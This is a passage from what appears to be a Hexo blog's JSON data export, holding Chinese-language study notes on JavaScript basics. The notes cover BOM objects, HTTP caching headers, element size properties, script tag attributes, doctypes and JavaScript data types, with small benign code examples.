本文地址：本文地址：[http://supermaryy.com/2016/09/11/read-book-professional-javascript1](http://luckymona.github.io/2016/09/11/read-book-professional-javascript1)\n\n参考链接：\n\n^1:[通过location.replace禁止浏览器后退防止重复提交](http://www.jb51.net/article/54781.htm)\n^2:[Don’t forget navigator.platform](https://www.nczonline.net/blog/2007/12/17/don-t-forget-navigator-platform/)\n^3:[What is the list of possible values for navigator.platform as of today?](http://stackoverflow.com/questions/19877924/what-is-the-list-of-possible-values-for-navigator-platform-as-of-today)\n^4:[如何修改游览器的navigator.platform属性？](https://www.zhihu.com/question/36609103)\n^5:[MDN Element.clientHeight](https://developer.mozilla.org/en-US/docs/Web/API/Element/clientHeight)\n\n","slug":"read-book-professional-javascript1","published":1,"updated":"2018-05-07T10:29:59.599Z","layout":"post","photos":[],"link":"","_id":"cjgw4449j00268d95u0l3ci6h","content":"<p>摘要：</p>\n<ol start=\"0\">\n<li>JS三个组成部分：ECMAScript 、DOM、BOM；</li>\n<li>DOM三级分别定义了什么；</li>\n<li>BOM主要定义了什么；</li>\n<li>BOM对象location、navigator、screen各自的属性和方法；</li>\n<li>If-Modified-Since；</li>\n<li>replace方法的特殊之处；</li>\n<li>screen、window、document概念区分及宽高属性获取；</li>\n<li>clientHeight / offsetHeight / scrollHeight 三者区分；</li>\n<li>怎么判断是否滚到底； </li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://supermaryy.com\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/11/read-book-professional-javascript1\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/11/read-book-professional-javascript1</a></p>\n</blockquote>\n<h1 id=\"一、Javascript基础\"><a href=\"#一、Javascript基础\" class=\"headerlink\" title=\"一、Javascript基础\"></a>一、Javascript基础</h1><h2 id=\"1-Javascript由ECMAScript-DOM-BOM-组成\"><a href=\"#1-Javascript由ECMAScript-DOM-BOM-组成\" class=\"headerlink\" title=\"1. Javascript由ECMAScript\\DOM\\BOM 组成\"></a>1. Javascript由ECMAScript\\DOM\\BOM 组成</h2><p>ECMAScript规定了这门语言的基础语法，Web浏览器只是ECMAScript的宿主环境之一，其他实现还有NodeJS、AS。</p>\n<h2 id=\"2-DOM\"><a href=\"#2-DOM\" class=\"headerlink\" title=\"2. DOM\"></a>2. DOM</h2><p>Document Object Model，文档对象模型，定义了访问和操作网页内容的接口和方法</p>\n<ul>\n<li>DOM一级，它把html文档映射为节点树，</li>\n<li><p>DOM二级定义了操作节点的方法范围和遍历、鼠标和用户界面事件、操纵css的方法：</p>\n<ul>\n<li>DOM视图（DOM Views）</li>\n<li>DOM事件（DOM Events）</li>\n<li>DOM样式（DOM Styles）</li>\n<li>DOM范围和遍历（DOM Traversal and Range）</li>\n</ul>\n</li>\n<li><p>DOM三级进一步扩展，新增DOM加载和保存模块（DOM Load and save），DOM验证模块（DOM Validation）</p>\n</li>\n</ul>\n<h2 id=\"3-BOM\"><a href=\"#3-BOM\" class=\"headerlink\" title=\"3.BOM\"></a>3.BOM</h2><p>Browser Object Model，定义与浏览器交互的接口方法。主要包括：</p>\n<ul>\n<li>弹出新窗口<code>window.open();</code></li>\n<li>对窗口进行移动、缩放、关闭 <code>window.moveTo(); window.resizeTo(); window.close();</code></li>\n<li>location对象，所加载网页的信息</li>\n<li>navigator对象，浏览器版本信息</li>\n<li>screen对象，提供屏幕分辨率信息</li>\n</ul>\n<h3 id=\"3-1-BOM之location对象\"><a href=\"#3-1-BOM之location对象\" class=\"headerlink\" title=\"3.1 BOM之location对象\"></a>3.1 BOM之location对象</h3><ul>\n<li>访问方式window.location，</li>\n<li>属性：hash（得到URL从#开始的字符串），host，hostname，href，pathname，port，protocol，search（得到URL从?开始的字符串）</li>\n<li>方法：assign、reload、replace</li>\n</ul>\n<h4 id=\"assign方法：\"><a href=\"#assign方法：\" class=\"headerlink\" title=\"assign方法：\"></a>assign方法：</h4><p>window.location.assign(URL),会在当前窗口加载另一个文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    function assign()&#123;</span><br><span class=\"line\">        window.location.assign(&apos;anotherDoc.html&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p onclick=&quot;assign()&quot;&gt;hello&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"reload方法：\"><a href=\"#reload方法：\" class=\"headerlink\" title=\"reload方法：\"></a>reload方法：</h4><p>window.location.reload(flase||force),可以模拟浏览器的刷新按钮</p>\n<ul>\n<li>参数值为false或不填，效果与浏览器刷新按钮一样，使用http头If-Modified-Since检测服务器上的文档有没有改变，没有改变就把浏览器缓存文件显示到浏览器中，如果改变了从服务器加载</li>\n<li>参数为force，效果与shift+浏览器刷新按钮，相同，强制从服务器加载<h4 id=\"http头If-Modified-Since实现浏览器缓存\"><a href=\"#http头If-Modified-Since实现浏览器缓存\" class=\"headerlink\" title=\"http头If-Modified-Since实现浏览器缓存\"></a>http头If-Modified-Since实现浏览器缓存</h4>发送请求时，写在http request header里面，如果页面是第一次加载则不写这个参数，第一次请求回来后，服务器返回200，并在response header中会返回一个Last-Modified，这是一个时间戳，代表请求的文件在服务器中最后修改的时间。浏览器会把这个时间戳和请求来的资源缓存下来，这时，按浏览器的刷新按钮之后，发起第二次请求，会在request header中加上If-Modified-Since这个字段，值为刚才的Last-Modified值，服务器收到请求就把IMS值与服务器上的Last-Modified值做对比，如果相同，证明文件没有发生改变，就返回304(Not Modified)，浏览器就从本地缓存加载文件，如果不相同，证明服务器上的文件已经改变，就返回200，浏览器显示请求回的新内容。<h4 id=\"replace方法：\"><a href=\"#replace方法：\" class=\"headerlink\" title=\"replace方法：\"></a>replace方法：</h4>window.location.replace(newURL)，加载新URL的文档内容，新URL将覆盖History对象中的当前记录，也就是不会产生新历史记录。想不到什么场景会需要这个功能，查了一下，有一种场景是^1，严格限制用户操作时，为防止后退后重复提交，可以在跳转时使用replace，这样就不能后退，防止重复提交。</li>\n</ul>\n<h4 id=\"重定向方法总结\"><a href=\"#重定向方法总结\" class=\"headerlink\" title=\"重定向方法总结\"></a>重定向方法总结</h4><p>window.location.href = newURL;<br>window.location.assign(newURL);<br>window.location.replace(newURL); 附加作用：不产生新History记录</p>\n<h3 id=\"3-2-BOM之Navigator对象\"><a href=\"#3-2-BOM之Navigator对象\" class=\"headerlink\" title=\"3.2 BOM之Navigator对象\"></a>3.2 BOM之Navigator对象</h3><ol>\n<li>自认为比较有用的属性：plugins，userAgent，cookieEnabled，appVersion,onLine,都是只读的属性，使用方法：<br><code>window.navigator.plugins</code></li>\n<li>一个迷思：我系统是win7 64位，然后我用window.navigator.platform，出来是”win32”<br>查到<code>With windows xp64-bit, it depends if you have Internet Explorer 64-bit. If it&#39;s the case: Win64. If it&#39;s the normal edition: Win32.</code>^2</li>\n<li>platform这个属性不是很可靠，定义经常变动^3，这个属性使用场景是，修改它以模拟不同系统^4</li>\n</ol>\n<h3 id=\"3-3-BOM之Screen对象\"><a href=\"#3-3-BOM之Screen对象\" class=\"headerlink\" title=\"3.3 BOM之Screen对象\"></a>3.3 BOM之Screen对象</h3><p>使用方法：<code>window.screen.height</code>，window可以省略不写<br>重要属性：<br><code>screen.availHeight</code>、<code>screen.availWidth</code>、<code>screen.height</code>、<code>screen.width</code></p>\n<h4 id=\"screen、window、document概念区分及宽高属性获取：\"><a href=\"#screen、window、document概念区分及宽高属性获取：\" class=\"headerlink\" title=\"screen、window、document概念区分及宽高属性获取：\"></a>screen、window、document概念区分及宽高属性获取：</h4><p><strong>1. screen</strong>：指屏幕，屏幕的概念就是显示器、显示屏，所以这里<code>screen.width\\screen.height</code>指的是整个屏幕的宽高，就是显示器的发光的这块宽高，而<code>screen.availWidth\\screen.availHeight</code>指的是window可获取的宽高，具体来说，一般情况下，availHeight是屏幕高度减去windows系统任务栏的高度（如下图），如果你把这个任务栏放在了左右某一侧，那么screen.availHeight===screen.height，这时候availWidth等于screen.width减去任务栏占去的宽度<br><img src=\"http://o798x2hdw.bkt.clouddn.com/screen_availH.png?imageView/2/w/500/q/90\" alt=\"availHeight\"></p>\n<p><strong>2. window</strong>：指窗口，一个屏幕上可以有多个窗口,关于宽高有两个属性:<code>window.innerHeight / window.outerHeight</code>:<img src=\"http://o798x2hdw.bkt.clouddn.com/window_innerW.png?imageView/2/w/500/q/90\" alt=\"window_innerW\"></p>\n<p>jquery中$(window)[0] ===window,<br><code>$(window).width() / $(window).height();</code>不包括滚动条宽度/高度，<br><code>window.innerWidth / window.innerheight</code>包括滚动条宽度/高度</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/jquery_window_width.png\" alt=\"jquery_window_width\"></p>\n<p><strong>3. document</strong>:指文档，</p>\n<p>document.body.clientHeight：body元素的宽高<br>document.documentElement.clientHeight：视口，不包含滚动条，等于window.innerHeight减去滚动条高度</p>\n<h4 id=\"几种size辨析\"><a href=\"#几种size辨析\" class=\"headerlink\" title=\"几种size辨析\"></a>几种size辨析</h4><p><strong>1. client size</strong>^5</p>\n<blockquote>\n<p>Element.clientHeight read-only property is zero for elements with no CSS or inline layout boxes, otherwise it’s  the inner height of an element in pixels, including padding but not the horizontal scrollbar height, border, or margin.</p>\n</blockquote>\n<p>凡是client size，包含padding，不包含滚动条、边框、margin:<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-client.png\" alt=\"Dimensions-client\"></p>\n<p><strong>2.offset size</strong></p>\n<blockquote>\n<p>The HTMLElement.offsetHeight read-only property is the height of the element including vertical padding and borders, in pixels, as an integer.</p>\n</blockquote>\n<p>凡是offset size，包含border和padding<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-offset.png\" alt=\"Dimensions-offset\"></p>\n<p><strong>3.scroll size</strong></p>\n<blockquote>\n<p>The Element.scrollHeight read-only attribute is a measurement of the height of an element’s content, including content not visible on the screen due to overflow.</p>\n</blockquote>\n<p>Element.scrollHeight：包含因滚动而不可见部分的整体高度<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-scroll.png\" alt=\"Dimensions-scroll\"></p>\n<p>用这个公式判断是否滚到底部了，使用场景是“我已经阅读了xxx”：<br><code>element.scrollHeight - element.scrollTop === element.clientHeight</code></p>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：本文地址：<a href=\"http://luckymona.github.io/2016/09/11/read-book-professional-javascript1\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/11/read-book-professional-javascript1</a></p>\n</blockquote>\n<p>参考链接：</p>\n<p>^1:<a href=\"http://www.jb51.net/article/54781.htm\" target=\"_blank\" rel=\"noopener\">通过location.replace禁止浏览器后退防止重复提交</a><br>^2:<a href=\"https://www.nczonline.net/blog/2007/12/17/don-t-forget-navigator-platform/\" target=\"_blank\" rel=\"noopener\">Don’t forget navigator.platform</a><br>^3:<a href=\"http://stackoverflow.com/questions/19877924/what-is-the-list-of-possible-values-for-navigator-platform-as-of-today\" target=\"_blank\" rel=\"noopener\">What is the list of possible values for navigator.platform as of today?</a><br>^4:<a href=\"https://www.zhihu.com/question/36609103\" target=\"_blank\" rel=\"noopener\">如何修改游览器的navigator.platform属性？</a><br>^5:<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Element/clientHeight\" target=\"_blank\" rel=\"noopener\">MDN Element.clientHeight</a></p>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol start=\"0\">\n<li>JS三个组成部分：ECMAScript 、DOM、BOM；</li>\n<li>DOM三级分别定义了什么；</li>\n<li>BOM主要定义了什么；</li>\n<li>BOM对象location、navigator、screen各自的属性和方法；</li>\n<li>If-Modified-Since；</li>\n<li>replace方法的特殊之处；</li>\n<li>screen、window、document概念区分及宽高属性获取；</li>\n<li>clientHeight / offsetHeight / scrollHeight 三者区分；</li>\n<li>怎么判断是否滚到底； </li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://supermaryy.com\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/11/read-book-professional-javascript1\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/11/read-book-professional-javascript1</a></p>\n</blockquote>\n<h1 id=\"一、Javascript基础\"><a href=\"#一、Javascript基础\" class=\"headerlink\" title=\"一、Javascript基础\"></a>一、Javascript基础</h1><h2 id=\"1-Javascript由ECMAScript-DOM-BOM-组成\"><a href=\"#1-Javascript由ECMAScript-DOM-BOM-组成\" class=\"headerlink\" title=\"1. Javascript由ECMAScript\\DOM\\BOM 组成\"></a>1. Javascript由ECMAScript\\DOM\\BOM 组成</h2><p>ECMAScript规定了这门语言的基础语法，Web浏览器只是ECMAScript的宿主环境之一，其他实现还有NodeJS、AS。</p>\n<h2 id=\"2-DOM\"><a href=\"#2-DOM\" class=\"headerlink\" title=\"2. DOM\"></a>2. DOM</h2><p>Document Object Model，文档对象模型，定义了访问和操作网页内容的接口和方法</p>\n<ul>\n<li>DOM一级，它把html文档映射为节点树，</li>\n<li><p>DOM二级定义了操作节点的方法范围和遍历、鼠标和用户界面事件、操纵css的方法：</p>\n<ul>\n<li>DOM视图（DOM Views）</li>\n<li>DOM事件（DOM Events）</li>\n<li>DOM样式（DOM Styles）</li>\n<li>DOM范围和遍历（DOM Traversal and Range）</li>\n</ul>\n</li>\n<li><p>DOM三级进一步扩展，新增DOM加载和保存模块（DOM Load and save），DOM验证模块（DOM Validation）</p>\n</li>\n</ul>\n<h2 id=\"3-BOM\"><a href=\"#3-BOM\" class=\"headerlink\" title=\"3.BOM\"></a>3.BOM</h2><p>Browser Object Model，定义与浏览器交互的接口方法。主要包括：</p>\n<ul>\n<li>弹出新窗口<code>window.open();</code></li>\n<li>对窗口进行移动、缩放、关闭 <code>window.moveTo(); window.resizeTo(); window.close();</code></li>\n<li>location对象，所加载网页的信息</li>\n<li>navigator对象，浏览器版本信息</li>\n<li>screen对象，提供屏幕分辨率信息</li>\n</ul>\n<h3 id=\"3-1-BOM之location对象\"><a href=\"#3-1-BOM之location对象\" class=\"headerlink\" title=\"3.1 BOM之location对象\"></a>3.1 BOM之location对象</h3><ul>\n<li>访问方式window.location，</li>\n<li>属性：hash（得到URL从#开始的字符串），host，hostname，href，pathname，port，protocol，search（得到URL从?开始的字符串）</li>\n<li>方法：assign、reload、replace</li>\n</ul>\n<h4 id=\"assign方法：\"><a href=\"#assign方法：\" class=\"headerlink\" title=\"assign方法：\"></a>assign方法：</h4><p>window.location.assign(URL),会在当前窗口加载另一个文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    function assign()&#123;</span><br><span class=\"line\">        window.location.assign(&apos;anotherDoc.html&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p onclick=&quot;assign()&quot;&gt;hello&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"reload方法：\"><a href=\"#reload方法：\" class=\"headerlink\" title=\"reload方法：\"></a>reload方法：</h4><p>window.location.reload(flase||force),可以模拟浏览器的刷新按钮</p>\n<ul>\n<li>参数值为false或不填，效果与浏览器刷新按钮一样，使用http头If-Modified-Since检测服务器上的文档有没有改变，没有改变就把浏览器缓存文件显示到浏览器中，如果改变了从服务器加载</li>\n<li>参数为force，效果与shift+浏览器刷新按钮，相同，强制从服务器加载<h4 id=\"http头If-Modified-Since实现浏览器缓存\"><a href=\"#http头If-Modified-Since实现浏览器缓存\" class=\"headerlink\" title=\"http头If-Modified-Since实现浏览器缓存\"></a>http头If-Modified-Since实现浏览器缓存</h4>发送请求时，写在http request header里面，如果页面是第一次加载则不写这个参数，第一次请求回来后，服务器返回200，并在response header中会返回一个Last-Modified，这是一个时间戳，代表请求的文件在服务器中最后修改的时间。浏览器会把这个时间戳和请求来的资源缓存下来，这时，按浏览器的刷新按钮之后，发起第二次请求，会在request header中加上If-Modified-Since这个字段，值为刚才的Last-Modified值，服务器收到请求就把IMS值与服务器上的Last-Modified值做对比，如果相同，证明文件没有发生改变，就返回304(Not Modified)，浏览器就从本地缓存加载文件，如果不相同，证明服务器上的文件已经改变，就返回200，浏览器显示请求回的新内容。<h4 id=\"replace方法：\"><a href=\"#replace方法：\" class=\"headerlink\" title=\"replace方法：\"></a>replace方法：</h4>window.location.replace(newURL)，加载新URL的文档内容，新URL将覆盖History对象中的当前记录，也就是不会产生新历史记录。想不到什么场景会需要这个功能，查了一下，有一种场景是^1，严格限制用户操作时，为防止后退后重复提交，可以在跳转时使用replace，这样就不能后退，防止重复提交。</li>\n</ul>\n<h4 id=\"重定向方法总结\"><a href=\"#重定向方法总结\" class=\"headerlink\" title=\"重定向方法总结\"></a>重定向方法总结</h4><p>window.location.href = newURL;<br>window.location.assign(newURL);<br>window.location.replace(newURL); 附加作用：不产生新History记录</p>\n<h3 id=\"3-2-BOM之Navigator对象\"><a href=\"#3-2-BOM之Navigator对象\" class=\"headerlink\" title=\"3.2 BOM之Navigator对象\"></a>3.2 BOM之Navigator对象</h3><ol>\n<li>自认为比较有用的属性：plugins，userAgent，cookieEnabled，appVersion,onLine,都是只读的属性，使用方法：<br><code>window.navigator.plugins</code></li>\n<li>一个迷思：我系统是win7 64位，然后我用window.navigator.platform，出来是”win32”<br>查到<code>With windows xp64-bit, it depends if you have Internet Explorer 64-bit. If it&#39;s the case: Win64. If it&#39;s the normal edition: Win32.</code>^2</li>\n<li>platform这个属性不是很可靠，定义经常变动^3，这个属性使用场景是，修改它以模拟不同系统^4</li>\n</ol>\n<h3 id=\"3-3-BOM之Screen对象\"><a href=\"#3-3-BOM之Screen对象\" class=\"headerlink\" title=\"3.3 BOM之Screen对象\"></a>3.3 BOM之Screen对象</h3><p>使用方法：<code>window.screen.height</code>，window可以省略不写<br>重要属性：<br><code>screen.availHeight</code>、<code>screen.availWidth</code>、<code>screen.height</code>、<code>screen.width</code></p>\n<h4 id=\"screen、window、document概念区分及宽高属性获取：\"><a href=\"#screen、window、document概念区分及宽高属性获取：\" class=\"headerlink\" title=\"screen、window、document概念区分及宽高属性获取：\"></a>screen、window、document概念区分及宽高属性获取：</h4><p><strong>1. screen</strong>：指屏幕，屏幕的概念就是显示器、显示屏，所以这里<code>screen.width\\screen.height</code>指的是整个屏幕的宽高，就是显示器的发光的这块宽高，而<code>screen.availWidth\\screen.availHeight</code>指的是window可获取的宽高，具体来说，一般情况下，availHeight是屏幕高度减去windows系统任务栏的高度（如下图），如果你把这个任务栏放在了左右某一侧，那么screen.availHeight===screen.height，这时候availWidth等于screen.width减去任务栏占去的宽度<br><img src=\"http://o798x2hdw.bkt.clouddn.com/screen_availH.png?imageView/2/w/500/q/90\" alt=\"availHeight\"></p>\n<p><strong>2. window</strong>：指窗口，一个屏幕上可以有多个窗口,关于宽高有两个属性:<code>window.innerHeight / window.outerHeight</code>:<img src=\"http://o798x2hdw.bkt.clouddn.com/window_innerW.png?imageView/2/w/500/q/90\" alt=\"window_innerW\"></p>\n<p>jquery中$(window)[0] ===window,<br><code>$(window).width() / $(window).height();</code>不包括滚动条宽度/高度，<br><code>window.innerWidth / window.innerheight</code>包括滚动条宽度/高度</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com/jquery_window_width.png\" alt=\"jquery_window_width\"></p>\n<p><strong>3. document</strong>:指文档，</p>\n<p>document.body.clientHeight：body元素的宽高<br>document.documentElement.clientHeight：视口，不包含滚动条，等于window.innerHeight减去滚动条高度</p>\n<h4 id=\"几种size辨析\"><a href=\"#几种size辨析\" class=\"headerlink\" title=\"几种size辨析\"></a>几种size辨析</h4><p><strong>1. client size</strong>^5</p>\n<blockquote>\n<p>Element.clientHeight read-only property is zero for elements with no CSS or inline layout boxes, otherwise it’s  the inner height of an element in pixels, including padding but not the horizontal scrollbar height, border, or margin.</p>\n</blockquote>\n<p>凡是client size，包含padding，不包含滚动条、边框、margin:<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-client.png\" alt=\"Dimensions-client\"></p>\n<p><strong>2.offset size</strong></p>\n<blockquote>\n<p>The HTMLElement.offsetHeight read-only property is the height of the element including vertical padding and borders, in pixels, as an integer.</p>\n</blockquote>\n<p>凡是offset size，包含border和padding<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-offset.png\" alt=\"Dimensions-offset\"></p>\n<p><strong>3.scroll size</strong></p>\n<blockquote>\n<p>The Element.scrollHeight read-only attribute is a measurement of the height of an element’s content, including content not visible on the screen due to overflow.</p>\n</blockquote>\n<p>Element.scrollHeight：包含因滚动而不可见部分的整体高度<br><img src=\"http://o798x2hdw.bkt.clouddn.com/Dimensions-scroll.png\" alt=\"Dimensions-scroll\"></p>\n<p>用这个公式判断是否滚到底部了，使用场景是“我已经阅读了xxx”：<br><code>element.scrollHeight - element.scrollTop === element.clientHeight</code></p>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：本文地址：<a href=\"http://luckymona.github.io/2016/09/11/read-book-professional-javascript1\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/11/read-book-professional-javascript1</a></p>\n</blockquote>\n<p>参考链接：</p>\n<p>^1:<a href=\"http://www.jb51.net/article/54781.htm\" target=\"_blank\" rel=\"noopener\">通过location.replace禁止浏览器后退防止重复提交</a><br>^2:<a href=\"https://www.nczonline.net/blog/2007/12/17/don-t-forget-navigator-platform/\" target=\"_blank\" rel=\"noopener\">Don’t forget navigator.platform</a><br>^3:<a href=\"http://stackoverflow.com/questions/19877924/what-is-the-list-of-possible-values-for-navigator-platform-as-of-today\" target=\"_blank\" rel=\"noopener\">What is the list of possible values for navigator.platform as of today?</a><br>^4:<a href=\"https://www.zhihu.com/question/36609103\" target=\"_blank\" rel=\"noopener\">如何修改游览器的navigator.platform属性？</a><br>^5:<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Element/clientHeight\" target=\"_blank\" rel=\"noopener\">MDN Element.clientHeight</a></p>"},{"title":"Javascript基础2","date":"2016-09-17T07:00:00.000Z","toc":true,"comments":1,"_content":"摘要：\n\n1. `<script>`的属性defer、async、src、type\n2. MINE类型、load事件、DOMContentLoaded事件\n3. 文档模式\n4. 报错\"Identifier Expected\"是因为标识符命名使用了关键字\n5. 用var定义变量和省略var造成的影响\n6. 5种基本数据类型，一种复杂数据类型，使用typeof分别返回什么值\n7. null和undefined的区别和联系，各自的使用场景，二者相等(==)，分别使用Number()和parseInt/parseFloat得到的值\n8. typeof可以使用未定义变量而不报错\n9. 会转换为false的五个值\n10. NaN的两个特性，isNaN函数判断是不是可以转换为数字\n11. 使用时一般用Number方法转换除string外的值，parseInt/parseFloat只能解析string值\n12. parseInt/parseFloat解析字符串规则是，第一位非空格值必须是数字，否则结果就是NaN\n13. 使用parseInt最好指明进制，parseInt('070',10)\n14. parseFloat只能解析十进制\n15. string字符字面量、转义序列，\\ntrbf,`\\\\` ,\\\",\\',\\xnn,\\unnnn\n16. string的length对双字节字符不准\n17. null和undefined没有toString()方法，所有类型都有String()方法\n18. number类型的toString()方法，可以传参，2、8、10、16，代表进制\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript2](http://luckymona.github.io/2016/09/17/read-book-professional-javascript2)\n\n# 一、使用Javascript #\n\n## 1.使用Javascript的两种方式 ##\n使用`<script>`内嵌或者引入外部脚本文件，不能既内嵌又引入，例如这样：\n```\n<script src=\"xxx.js\">\nconsole.log('js');\n</script\n```\n此时浏览器不解析内嵌的JS代码，只解析引入的代码。\n最佳实践是使用外部文件，而非嵌入，优点有：易维护、可缓存（同一个文件可以多除引用）、适应未来\n## 2.`<script>`标签的常用属性有：src, defer, async,type ##\n\n- type, 描述引入文件的MIME类型\n- src，有src属性的标签都可以跨域，这样的标签有`<script>`, `<img>`,`<iframe>`\n- defer, 只能在外部脚本文件上使用，表示延迟到文档完全被解析和显示后再加载，照HTML5规定，会在DOMContentLoaded事件触发前执行(浏览器实现不一定会在此之前执行)，即遇到`</html>`标签在执行，用法：`<script defer scr=\"xx.js\"></script>`\n- async，HTML5定义的属性，只能在外部脚本文件上使用，表示开始执行JS脚本，但是不阻塞后面脚本的执行。标记为async的多个`<script>`标签，并不一定按照前后顺序执行。async脚本一定会在load事件之前执行，但可能会在DOMContentLoaded事件触发之前或之后执行\n\n把`<script>`引入文件放在body标签的最后，防止阻塞页面展现\n\n**MIME：**定义数据格式，前面是数据的大类型，后面是具体类型，如text/html、img/gif等\n**load事件：**在页面中的一切都加载完毕时触发，包括JS脚本、CSS、图片等\n**DOMContentLoaded事件：**DOM节点树映射完成时触发，高程P408\n\n## 3.文档模式 ##\n通过DOCTYPE区分文档模式，分为混杂模式、标准模式和准标准模式，混杂模式会让IE表现出与IE5相同的行为，如果不加DOCTYPE会让浏览器按混杂模式解析。标准模式和准标准模式有很小的差别，**标准模式**(不探讨XHTML)：\n```\n<!-- HTML 4.01 严格型 -->\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n\"http://www.w3.org/TR/html4/strict.dtd\">\n\n<!-- HTML 5 -->\n<!DOCTYPE html>\n```\n**准标准模式**：\n```\n<!-- HTML 4.01 过渡型 -->\n<!DOCTYPE HTML PUBLIC\n\"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n\n<!-- HTML 4.01 框架集型 -->\n<!DOCTYPE HTML PUBLIC\n\"-//W3C//DTD HTML 4.01 Frameset//EN\"\n\"http://www.w3.org/TR/html4/frameset.dtd\">\n```\n现在一般使用html5的DOCTYPE声明\n\n# 二、基本概念 #\n\n1. JS中的一切都 **区分大小写**\n2. 标识符的第一位可以是字母、下划线、美元符$: aa、 _a、 $a；还可以是中文，但是不推荐\n3. 严格模式`use strict`，IE10+\n4. 关键字和保留字都不能做标识符，关键字做，会报错 **\"Identifier Expected\"**\n5. JS中的变量是松散类型的，也就是可以保存任何类型，**变量只是一个占位符**\n6. **用var定义的变量，会成为所在作用域的局部变量**，与外界无关，当函数运行完毕，会被销毁![var](http://o798x2hdw.bkt.clouddn.com/var.png)\n7. **在函数中省略var，会创建一个全局变量**，非常不建议这样做，因为在局部作用域定义的全局变量很难维护\n\n# 三、数据类型 #\n这一部分在if else控制流程时很重要的。\n\nJS中共6种数据类型，5种基本(简单)数据类型：Null、Undefined、String、Number、Boolean\n1种复杂数据类型：Object\n\n## 3.1检测数据类型使用typeof ##\n对应的可以检测出来的值有：还是六种类型，null会被检测为\"object\", function不是一种数据类型，但是会被检测为\"function\"\n|  数据类型 | typeof 检测值 |\n|-----------|---------------|\n| null      | \"object\"      |\n| undefined | \"undefined\"   |\n| string    | \"string\"      |\n| number    | \"number\"      |\n| boolean   | \"boolean\"     |\n| object    | \"object\" / \"function\" |\n例外:正则表达式，在Safari 5和Chrome 7前版本浏览器中，typeof值为\"function\"，新版本为\"object\"\n\n## 3.2 null与undefined区别 ##\n### 1. undefined ###\n\n1. 定义：已经定义但没有赋值，即没有初始化的变量 `var a; // a === undefined`\n2. 没必要显式赋值，变量未初始化时默认是undefined\n3. 使用场景：\n\n - `var a`定义变量而不初始化，默认值为undefined\n - `if (a=== undefined)`流程控制时做判断条件\n - 对象属性没有赋值，默认值为`undefined`^1\n`var a={bb:\"xx\"}; console.log(a.aa); `\n - 函数不显式定义返回值，默认返回`undefined`\n```\nfunction aa(){\n    var a=1;\n    a++;\n}\nconsole.log(aa()); // undefined\n```\n - 调用函数时，该提供的参数没有提供，参数值默认为`undefined`\n ```\n function aa(bb){\n            console.log(bb);\n        }\n        aa();\n ```\n\n### 2.null ###\n\n1. 定义: 空对象指针\n2. 应该显式赋值  初始化一个未来保存object变量时，初始化为null\n3. 使用场景：\n\n- 作为对象初始化的值`var timer = null;`\n- 作为函数的参数，表示该函数的参数不是对象（这一条的用法不是很理解，谁知道吗？告诉我一下）\n- null不是对象，但是是对象原型链的终点`Object.prototype.__proto__； // null`而null没有prototype；\n- `var dom = document.getElementById('domId');`如果domId不存在，dom变量为null\n\n### 3. 其他 ###\n1.  undefined 值是派生自 null 值的，所以`null == undefined；//true`但是`null === undefined //false`\n2. `Number(undefined) = NaN; Number(null) = 0`，但是使用parseInt和parseFloat都是NaN\n3. \n```\nvar aa;\nconsole.log(aa); //undefined\nconsole.log(bb); // 报错\nconsole.log(typeof bb) //undefined\n```\n\n## 3.3 Number类型 ##\n1. 